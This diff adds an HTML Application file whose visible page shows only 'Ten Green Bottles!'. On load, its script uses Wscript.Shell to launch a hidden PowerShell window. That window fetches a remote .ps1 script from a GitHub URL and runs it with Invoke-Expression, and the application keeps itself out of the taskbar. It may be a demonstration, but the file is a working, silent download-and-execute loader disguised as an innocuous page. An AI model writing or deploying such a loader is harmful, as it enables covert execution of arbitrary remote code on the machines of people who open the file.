@@ -1,0 +1,22 @@
+<html>
+<head>
+  <title>Other</title>
+  <hta:application id="oHTA" 
+    applicationname="Other Attempt" 
+    showintaskbar="no"
+    singleinstance="yes"
+    windowstate="" />
+
+  <script>
+    function window.onload()
+    {
+     zz = new ActiveXObject("Wscript.Shell");
+     zz.Run("c:\windows\\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -command \"Invoke-Expression (Invoke-WebRequest 'https://raw.githubusercontent.com/theclintox/example-files/master/greenbottles.ps1' -UseBasicParsing)\"", 0, false);
+    }
+  </script>
+</head>
+
+<body>
+  <p>Ten Green Bottles!</p>
+</body>
+</html>
